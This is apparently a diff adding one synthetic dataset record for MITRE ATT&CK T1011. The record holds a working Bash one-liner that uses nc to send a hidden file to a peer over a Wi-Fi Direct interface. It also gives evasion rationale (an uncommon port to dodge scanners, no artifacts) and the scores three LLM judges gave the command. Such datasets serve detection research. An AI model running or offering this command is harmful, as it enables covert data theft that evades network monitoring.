@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i p2p-wlp2s0-0 -nn tcp port 55219 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.49.1 192.168.49.2 55219 < /var/tmp/.cache/sys.snap",
+  "explanation": "Exfiltrates using a Wi\u2011Fi Direct (P2P) interface isolated from the corporate WLAN, with tcpdump passively observing only that TCP port. This leverages a distinct wireless medium per T1011.",
+  "rationale_steps": [
+    "Target the P2P Wi-Fi interface to avoid the primary Wi-Fi network.",
+    "Select uncommon port 55219 to evade common scanners.",
+    "Background tcpdump on the specific interface/port, no file artifacts.",
+    "Use nc with -s to bind to the P2P interface's IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-8aafe9f5",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command chaining, redirections, backgrounding, and flags for tcpdump and nc are valid and well-formed with no quoting issues.",
+        "semantic_score": 4,
+        "semantic_justification": "nc binds to the Wi-Fi Direct IP to exfiltrate over that interface aligning with T1011, though tcpdump capture may fail without elevated privileges and the specific interface/IP assumptions must hold.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:12:44.112807Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by exfiltrating data over a Wi-Fi Direct (p2p-wlp2s0-0) interface separate from the main network, using netcat to transfer the file while tcpdump monitors the connection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:12:46.982063Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid flags for `nohup`, `tcpdump`, and `nc`, and employs correct command chaining and redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "The `nc` portion correctly implements exfiltration over an alternative network medium, aligning with T1011, but the `tcpdump` command for 'passively observing' is unlikely to execute successfully without root privileges, directly contradicting the stated 'Privilege: None' constraint.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T06:26:33.678642Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
